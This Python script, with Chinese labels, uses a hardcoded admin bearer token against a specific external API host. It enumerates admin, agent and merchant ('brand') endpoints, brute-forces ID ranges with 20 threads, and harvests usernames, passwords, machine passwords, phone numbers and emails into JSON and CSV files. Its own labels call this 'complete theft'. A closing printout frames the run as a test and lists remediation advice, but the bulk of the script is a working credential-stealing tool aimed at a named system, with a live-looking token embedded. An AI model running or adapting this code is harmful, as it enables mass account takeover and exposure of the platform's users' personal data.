import requests
import json
from datetime import datetime
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# 使用總站 Token（權限最高）
ADMIN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dwYXBpLmxkanptci50b3AvYWRtaW4vbG9naW4iLCJpYXQiOjE3NzEwMDk2NTksImV4cCI6MTgwMjU0NTY1OSwibmJmIjoxNzcxMDA5NjU5LCJqdGkiOiJzWXJFVE0wUEJNOXBNTUVOIiwic3ViIjoiOTk5IiwicHJ2IjoiNzIzNDlhZmZkYTA0NGRjMmFkNzBhMzllZjE1MTYzZWE2N2E3MzMxMyJ9.WGfPfTVyEe2PGdkPcN1Im3ig0t0-hWmHtCx00t3rFUs"

BASE_URL = "https://wpapi.ldjzmr.top"

headers = {
    "Authorization": f"Bearer {ADMIN_TOKEN}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# 儲存結果
all_admins = []
all_agents = []
all_brands = []
lock = threading.Lock()

print("="*120)
print("🔥🔥🔥 完整竊取：總站 + 代理 + 商戶 的所有帳號密碼")
print("="*120)
print(f"測試時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"使用角色: 總站（Admin）- 最高權限")
print(f"目標: 竊取所有角色的帳號密碼")
print("="*120 + "\n")

# ============================================================================
# 步驟 1: 竊取總站管理員帳號
# ============================================================================
print("📍 步驟 1: 竊取總站（Admin）帳號")
print("-"*120 + "\n")

admin_endpoints = [
    "/admin/admin",
    "/admin/admins",
    "/admin/user",
    "/admin/users",
    "/admin/admin/list",
    "/admin/manager",
]

for endpoint in admin_endpoints:
    try:
        response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 0 and 'data' in data:
                print(f"✓ 找到端點: {endpoint}")
                
                # 提取管理員列表
                admins = None
                if isinstance(data['data'], list):
                    admins = data['data']
                elif isinstance(data['data'], dict):
                    admins = data['data'].get('data', []) or data['data'].get('list', [])
                
                if admins:
                    print(f"  找到 {len(admins)} 個管理員\n")
                    
                    for admin in admins:
                        admin_info = {
                            'id': admin.get('id'),
                            'username': admin.get('username', admin.get('account', admin.get('name', 'N/A'))),
                            'password': admin.get('password', 'N/A'),
                            'email': admin.get('email', 'N/A'),
                            'phone': admin.get('phone', 'N/A'),
                            'role': admin.get('role', admin.get('role_name', 'Admin')),
                            'status': admin.get('status', 'N/A')
                        }
                        
                        all_admins.append(admin_info)
                        
                        print(f"  🔑 管理員 ID={admin_info['id']:4} | 帳號:{admin_info['username']:15} | 密碼:{admin_info['password']}")
                    
                    print()
                    break
    except Exception as e:
        pass

if not all_admins:
    print("❌ 無法獲取管理員列表\n")
    # 嘗試單個獲取
    for admin_id in range(1, 100):
        try:
            response = requests.get(f"{BASE_URL}/admin/admin/{admin_id}", headers=headers, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('code') == 0:
                    admin = data.get('data')
                    admin_info = {
                        'id': admin.get('id'),
                        'username': admin.get('username', 'N/A'),
                        'password': admin.get('password', 'N/A'),
                        'role': 'Admin'
                    }
                    all_admins.append(admin_info)
                    print(f"  🔑 ID={admin_info['id']:4} | {admin_info['username']:15} | {admin_info['password']}")
        except:
            pass

# ============================================================================
# 步驟 2: 竊取代理（Agent）帳號
# ============================================================================
print("\n" + "="*120)
print("📍 步驟 2: 竊取代理（Agent）帳號")
print("-"*120 + "\n")

agent_endpoints = [
    "/admin/agent",
    "/admin/agents",
    "/admin/agent/list",
]

for endpoint in agent_endpoints:
    try:
        response = requests.get(f"{BASE_URL}{endpoint}", headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 0 and 'data' in data:
                print(f"✓ 找到端點: {endpoint}")
                
                # 提取代理列表
                agents = None
                if isinstance(data['data'], list):
                    agents = data['data']
                elif isinstance(data['data'], dict):
                    agents = data['data'].get('data', []) or data['data'].get('list', [])
                
                if agents:
                    print(f"  找到 {len(agents)} 個代理\n")
                    
                    for agent in agents:
                        agent_info = {
                            'id': agent.get('id'),
                            'username': agent.get('username', agent.get('account', 'N/A')),
                            'password': agent.get('password', 'N/A'),
                            'machine_password': agent.get('machine_password', 'N/A'),
                            'name': agent.get('name', 'N/A'),
                            'phone': agent.get('phone', 'N/A'),
                            'status': agent.get('status', 'N/A')
                        }
                        
                        all_agents.append(agent_info)
                        
                        pwd_display = agent_info['password'] if agent_info['password'] != 'N/A' else agent_info['machine_password']
                        print(f"  🔑 代理 ID={agent_info['id']:4} | 帳號:{agent_info['username']:15} | 密碼:{pwd_display}")
                    
                    print()
                    break
    except Exception as e:
        pass

if not all_agents:
    print("❌ 無法獲取代理列表，嘗試暴力掃描...\n")
    
    def scan_agent(agent_id):
        try:
            response = requests.get(f"{BASE_URL}/admin/agent/{agent_id}", headers=headers, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('code') == 0:
                    agent = data.get('data')
                    agent_info = {
                        'id': agent.get('id'),
                        'username': agent.get('username', 'N/A'),
                        'password': agent.get('password', agent.get('machine_password', 'N/A')),
                    }
                    with lock:
                        all_agents.append(agent_info)
                        print(f"  🔑 ID={agent_info['id']:4} | {agent_info['username']:15} | {agent_info['password']}")
        except:
            pass
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_agent, i) for i in range(1, 200)]
        for future in as_completed(futures):
            pass
    print()

# ============================================================================
# 步驟 3: 竊取商戶（Brand）帳號（使用你之前的代碼）
# ============================================================================
print("="*120)
print("📍 步驟 3: 竊取商戶（Brand）帳號")
print("-"*120 + "\n")

def steal_brand_account(brand_id):
    """竊取單個商戶的帳號和機器密碼"""
    try:
        response = requests.get(
            f"{BASE_URL}/admin/brand/{brand_id}",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('code') == 0 and 'data' in data:
                brand_data = data['data']
                
                brand_info = {
                    'brand_id': brand_id,
                    'brand_name': brand_data.get('name', 'N/A'),
                    'username': brand_data.get('username', 'N/A'),
                    'machine_password': brand_data.get('machine_password', 'N/A'),
                    'phone': brand_data.get('phone', 'N/A'),
                    'agent_id': brand_data.get('agent_id', 'N/A'),
                }
                
                with lock:
                    all_brands.append(brand_info)
                    print(f"  🔑 商戶 ID={brand_id:4} | {brand_info['brand_name']:15} | 帳號:{brand_info['username']:15} | 密碼:{brand_info['machine_password']}")
                
                return brand_info
        
        return None
        
    except Exception as e:
        return None

print("掃描 brand_id 1-500...\n")

start_time = time.time()

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(steal_brand_account, i) for i in range(1, 501)]
    
    for future in as_completed(futures):
        pass

end_time = time.time()
scan_duration = end_time - start_time

print(f"\n掃描完成，耗時: {scan_duration:.2f} 秒\n")

# ============================================================================
# 步驟 4: 統計和保存
# ============================================================================
print("="*120)
print("📊 竊取結果統計")
print("="*120 + "\n")

print(f"總站管理員: {len(all_admins)} 個")
print(f"代理帳號: {len(all_agents)} 個")
print(f"商戶帳號: {len(all_brands)} 個")
print(f"\n總共竊取: {len(all_admins) + len(all_agents) + len(all_brands)} 個帳號\n")

# 保存完整報告
full_report = {
    "scan_time": datetime.now().isoformat(),
    "summary": {
        "total_admins": len(all_admins),
        "total_agents": len(all_agents),
        "total_brands": len(all_brands),
        "grand_total": len(all_admins) + len(all_agents) + len(all_brands)
    },
    "admins": all_admins,
    "agents": all_agents,
    "brands": all_brands
}

# JSON 報告
json_filename = f"all_accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(json_filename, 'w', encoding='utf-8') as f:
    json.dump(full_report, f, ensure_ascii=False, indent=2)

print(f"✓ JSON 報告已保存: {json_filename}")

# CSV 報告 - 分別保存
if all_admins:
    admin_csv = f"admins_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(admin_csv, 'w', encoding='utf-8') as f:
        f.write("ID,帳號,密碼,角色,郵箱,電話,狀態\n")
        for admin in all_admins:
            f.write(f"{admin['id']},{admin['username']},{admin['password']},{admin['role']},{admin.get('email','')},{admin.get('phone','')},{admin.get('status','')}\n")
    print(f"✓ 管理員 CSV: {admin_csv}")

if all_agents:
    agent_csv = f"agents_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(agent_csv, 'w', encoding='utf-8') as f:
        f.write("ID,帳號,密碼,名稱,電話,狀態\n")
        for agent in all_agents:
            f.write(f"{agent['id']},{agent['username']},{agent['password']},{agent.get('name','')},{agent.get('phone','')},{agent.get('status','')}\n")
    print(f"✓ 代理 CSV: {agent_csv}")

if all_brands:
    brand_csv = f"brands_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(brand_csv, 'w', encoding='utf-8') as f:
        f.write("商戶ID,商戶名稱,帳號,密碼,電話,代理ID\n")
        for brand in all_brands:
            f.write(f"{brand['brand_id']},{brand['brand_name']},{brand['username']},{brand['machine_password']},{brand['phone']},{brand['agent_id']}\n")
    print(f"✓ 商戶 CSV: {brand_csv}")

# ============================================================================
# 詳細展示
# ============================================================================
print("\n" + "="*120)
print("🔑 竊取的帳號詳情")
print("="*120 + "\n")

if all_admins:
    print(f"【總站管理員】共 {len(all_admins)} 個:")
    print("-"*120)
    for i, admin in enumerate(all_admins[:10]):
        print(f"{i+1}. ID={admin['id']:4} | 帳號:{admin['username']:20} | 密碼:{admin['password']:30} | 角色:{admin.get('role', 'N/A')}")
    if len(all_admins) > 10:
        print(f"   ...還有 {len(all_admins)-10} 個")
    print()

if all_agents:
    print(f"【代理】共 {len(all_agents)} 個:")
    print("-"*120)
    for i, agent in enumerate(all_agents[:10]):
        print(f"{i+1}. ID={agent['id']:4} | 帳號:{agent['username']:20} | 密碼:{agent['password']:30}")
    if len(all_agents) > 10:
        print(f"   ...還有 {len(all_agents)-10} 個")
    print()

if all_brands:
    print(f"【商戶】共 {len(all_brands)} 個:")
    print("-"*120)
    for i, brand in enumerate(all_brands[:20]):
        print(f"{i+1}. ID={brand['brand_id']:4} | {brand['brand_name']:15} | 帳號:{brand['username']:20} | 密碼:{brand['machine_password']:15}")
    if len(all_brands) > 20:
        print(f"   ...還有 {len(all_brands)-20} 個")
    print()

# ============================================================================
# 最終報告
# ============================================================================
print("="*120)
print("🔥 最終報告：完整系統帳號洩露")
print("="*120)
print(f"""
竊取統計:
  總站管理員: {len(all_admins)} 個
  代理帳號: {len(all_agents)} 個
  商戶帳號: {len(all_brands)} 個
  ---------------------------
  總計: {len(all_admins) + len(all_agents) + len(all_brands)} 個帳號

危險等級: 🔴🔴🔴🔴🔴 極度危險

影響:
  🔴 整個平台的所有帳號密碼全部洩露
  🔴 包括最高權限的管理員帳號
  🔴 可以完全控制整個系統
  🔴 可以登入任何角色的帳號
  🔴 財務、客戶、商業機密全部暴露

法律風險:
  ⚖️ 嚴重違反個資法
  ⚖️ 可能涉及刑事責任
  ⚖️ 巨額賠償責任

證據文件:
  - 完整報告: {json_filename}
  - 管理員: {admin_csv if all_admins else 'N/A'}
  - 代理: {agent_csv if all_agents else 'N/A'}
  - 商戶: {brand_csv if all_brands else 'N/A'}

緊急建議:
  🔴 立即停止系統運作
  🔴 強制所有用戶更改密碼
  🔴 修復所有 API 權限檢查
  🔴 通知所有受影響用戶
  🔴 準備法律應對
  🔴 考慮聘請專業資安團隊
""")

print("="*120)
print("⚠️⚠️⚠️ 測試完成！整個系統的帳號體系完全洩露！")
print("="*120)